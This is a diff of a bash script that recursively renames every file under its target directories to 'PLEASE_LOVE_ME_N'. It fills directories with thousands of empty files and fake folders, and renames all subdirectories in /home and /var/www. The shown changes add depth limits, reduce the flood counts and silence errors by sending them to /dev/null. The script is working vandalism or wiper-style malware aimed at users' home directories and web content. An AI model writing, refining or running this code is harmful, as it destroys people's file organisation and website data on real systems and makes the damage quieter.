@@ -13,51 +13,60 @@ dir_counter=1
 
 rename_files() {
     local dir="$1"
+    local depth="${2:-0}"
+    [ "$depth" -gt 6 ] && return
+
     for file in "$dir"/*; do
         [ -f "$file" ] || continue
-        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${counter}"
+        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${counter}" 2>/dev/null
         ((counter++))
     done
     for entry in "$dir"/*/; do
         [ -d "$entry" ] || continue
-        rename_files "${entry%/}"
+        rename_files "${entry%/}" $((depth + 1))
     done
 }
 
 create_files() {
     local dir="$1"
+    local depth="${2:-0}"
+    [ "$depth" -gt 6 ] && return
+
     local has_subdirs=0
     for entry in "$dir"/*/; do
         [ -d "$entry" ] && { has_subdirs=1; break; }
     done
+
     if [ "$has_subdirs" -eq 0 ]; then
-        for i in {1..100}; do
+        for i in {1..50}; do
             local fakedir="$dir/PLEASE_LOVE_ME_${i}"
-            mkdir -p "$fakedir"
-            for j in {1..200}; do
-                > "$fakedir/PLEASE_LOVE_ME_${j}"
+            mkdir -p "$fakedir" 2>/dev/null
+            for j in {1..20}; do
+                > "$fakedir/PLEASE_LOVE_ME_${j}" 2>/dev/null
             done
         done
     else
         for entry in "$dir"/*/; do
             [ -d "$entry" ] || continue
             entry="${entry%/}"
-            for i in {1..200}; do
-                > "$entry/PLEASE_LOVE_ME_${i}"
+            for i in {1..20}; do
+                > "$entry/PLEASE_LOVE_ME_${i}" 2>/dev/null
             done
-            create_files "$entry"
+            create_files "$entry" $((depth + 1))
         done
     fi
 }
 
 rename_dirs() {
     local dir="$1"
-    # Rename subdirs bottom-up (recurse first, rename after)
+    local depth="${2:-0}"
+    [ "$depth" -gt 6 ] && return
+
     for entry in "$dir"/*/; do
         [ -d "$entry" ] || continue
         entry="${entry%/}"
-        rename_dirs "$entry"
-        mv "$entry" "${entry%/*}/PLEASE_LOVE_ME_DIR_${dir_counter}"
+        rename_dirs "$entry" $((depth + 1))
+        mv "$entry" "${entry%/*}/PLEASE_LOVE_ME_DIR_${dir_counter}" 2>/dev/null
         ((dir_counter++))
     done
 }
@@ -72,9 +81,8 @@ for target in "${TARGET_DIRS[@]}"; do
     create_files "$target"
 done
 
-# Rename subdirs in /home and /var/www last, bottom-up
 for target in /home /var/www; do
-    [ -d "$target" ] || { echo "[SKIP] $target not found"; continue; }
+    [ -d "$target" ] || continue
     echo "[*] Renaming dirs in $target"
     rename_dirs "$target"
 done
